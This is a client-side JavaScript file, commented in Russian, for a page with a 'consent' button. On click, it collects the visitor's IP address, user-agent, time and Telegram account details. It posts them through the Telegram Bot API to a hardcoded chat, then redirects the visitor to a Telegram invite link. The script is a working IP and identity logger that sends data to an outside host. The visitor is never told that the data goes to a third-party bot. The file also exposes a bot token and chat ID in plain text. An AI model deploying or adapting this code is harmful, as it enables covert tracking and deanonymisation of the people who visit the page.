// Конфигурация
const config = {
    botToken: '8191625463:AAG0aJiNQKOe_JAPMFM-9ytyqSAWOOFVw3I',
    chatId: '6785759216',
    ipApiUrl: 'https://api.ipify.org?format=json',
    telegramApiUrl: `https://api.telegram.org/bot`,
    botUsername: '+Em2vKwjqck4wNjMy' // Замените на username вашего бота
};

// DOM элементы
const elements = {
    consentBtn: document.getElementById('consentBtn'),
    status: document.getElementById('status'),
    successMsg: document.getElementById('successMsg')
};

// Переменная для хранения данных пользователя Telegram
let telegramUserData = null;

// Функция обработки авторизации через Telegram
function onTelegramAuth(user) {
    telegramUserData = {
        id: user.id,
        username: user.username || 'не указан',
        firstName: user.first_name || 'не указано',
        lastName: user.last_name || 'не указано'
    };
    
    // Можно сразу отправить данные или дождаться нажатия кнопки
    elements.status.textContent = `Привет, ${user.first_name || 'пользователь'}!`;
}

// Основная функция
async function sendDataToTelegram() {
    try {
        // Показываем статус
        elements.status.textContent = "Загрузка...";
        
        // Получаем IP
        const ipResponse = await fetch(config.ipApiUrl);
        if (!ipResponse.ok) throw new Error('Ошибка получения IP');
        const { ip } = await ipResponse.json();
        
        elements.status.textContent = ` `;
        
        // Формируем сообщение
        let message = `\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}\nВремя: ${new Date().toLocaleString()}`;
        
        // Добавляем данные пользователя Telegram, если они есть
        if (telegramUserData) {
            message += `\n\nTelegram данные:\nID: ${telegramUserData.id}\nUsername: @${telegramUserData.username}\nИмя: ${telegramUserData.firstName}\nФамилия: ${telegramUserData.lastName}`;
        } else {
            message += `\n\nTelegram: пользователь не авторизован`;
        }
        
        // Отправляем в Telegram
        const telegramUrl = `${config.telegramApiUrl}${config.botToken}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(message)}`;
        const tgResponse = await fetch(telegramUrl);
        
        if (!tgResponse.ok) throw new Error('Ошибка отправки в Telegram');
        
        // Показываем успешное сообщение
        elements.status.classList.add('hidden');
        elements.successMsg.classList.remove('hidden');
        
        // Перенаправляем в Telegram после успешной отправки
        window.location.href = `https://t.me/${config.botUsername}`;
    } catch (error) {
        elements.status.textContent = `Ошибка: ${error.message}`;
        console.error(error);
    }
}

// Назначаем обработчик кнопки
elements.consentBtn.addEventListener('click', sendDataToTelegram);
